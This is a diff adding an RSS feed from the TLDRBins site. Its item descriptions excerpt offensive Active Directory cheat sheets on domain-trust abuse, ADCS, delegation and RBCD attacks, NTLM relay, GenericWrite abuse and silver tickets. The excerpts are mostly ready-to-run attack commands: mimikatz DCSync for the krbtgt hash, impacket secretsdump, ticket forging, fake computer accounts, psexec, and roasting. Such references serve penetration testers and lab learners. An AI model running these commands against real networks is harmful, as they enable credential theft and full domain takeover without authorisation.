@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Ticket Granting Ticket on TLDRBins</title>
+    <link>https://tldrbins.github.io/@ticket-granting-ticket/</link>
+    <description>Recent content in Ticket Granting Ticket on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@ticket-granting-ticket/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Abuse Parent Child Domain Trusts</title>
+      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
+      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID .\mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain .\mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
+    </item>
+    <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
+    </item>
+    <item>
+      <title>AllowedToDelegate</title>
+      <link>https://tldrbins.github.io/allowedtodelegate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
+      <description>Privesc #1: Forge a Ticket Linux Windows 1. Get a service ticket # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; 2. Remote export KRB5CCNAME=Administrator.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; wmiexec.py -k -no-pass administrator@&amp;lt;DC&amp;gt; Note: impacket-wmiexec may not work&#xA;1. TO-DO TO-DO </description>
+    </item>
+    <item>
+      <title>Constrained Delegation</title>
+      <link>https://tldrbins.github.io/constrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
+      <description>Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 2. Get a service ticket impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 3. RBCD Attack # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USER&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k 4.</description>
+    </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
+    </item>
+    <item>
+      <title>Kerberos</title>
+      <link>https://tldrbins.github.io/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kerberos/</guid>
+      <description>Users enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; Ref: kerbrute&#xA;Usernames generator username-anarchy ./username-anarchy -i &amp;lt;USERS_FILE&amp;gt; | tee &amp;lt;USERNAMES_FILE&amp;gt; Ref: username-anarchy&#xA;Generate Kerberos ticket (From Linux) Kinit Impacket 1. Set up # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) &amp;lt;TARGET&amp;gt; &amp;lt;DC&amp;gt; &amp;lt;DOMAIN&amp;gt; # Step 2: Add domain controller as a DNS server to &amp;#39;/etc/resolv.</description>
+    </item>
+    <item>
+      <title>Machine Account</title>
+      <link>https://tldrbins.github.io/machine_account/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/machine_account/</guid>
+      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 1. Convert kirbi to ccache python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 2. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache&#xA;1. TO-DO TO-DO </description>
+    </item>
+    <item>
+      <title>NTLM Relay Attack</title>
+      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
+      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
+    </item>
+    <item>
+      <title>RBCD Attack</title>
+      <link>https://tldrbins.github.io/rbcd/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rbcd/</guid>
+      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;TARGET&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 2. Rbcd attack impacket-rbcd -delegate-to &amp;#39;&amp;lt;TARGET_COMPUTER&amp;gt;$&amp;#39; -delegate-from &amp;#39;EvilComputer$&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -action &amp;#39;write&amp;#39; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 3. Impersonate sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -spn cifs/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator -dc-ip &amp;lt;DC&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/EvilComputer:&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_&amp;lt;TARGET_DOMAIN&amp;gt;@&amp;lt;DOMAIN&amp;gt;.ccache 5. Post-Attack # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-psexec &amp;lt;DOMAIN&amp;gt;/administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass # Or secretsdump impacket-secretsdump administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass -just-dc-user Administrator 1.</description>
+    </item>
+    <item>
+      <title>Silver Ticket</title>
+      <link>https://tldrbins.github.io/silver_ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/silver_ticket/</guid>
+      <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 4. Generate Silver Ticket impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC&amp;gt; -spn &amp;lt;SPN&amp;gt; administrator 5.</description>
+    </item>
+    <item>
+      <title>Winrm from Windows VM</title>
+      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
+      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
+    </item>
+  </channel>
+</rss>
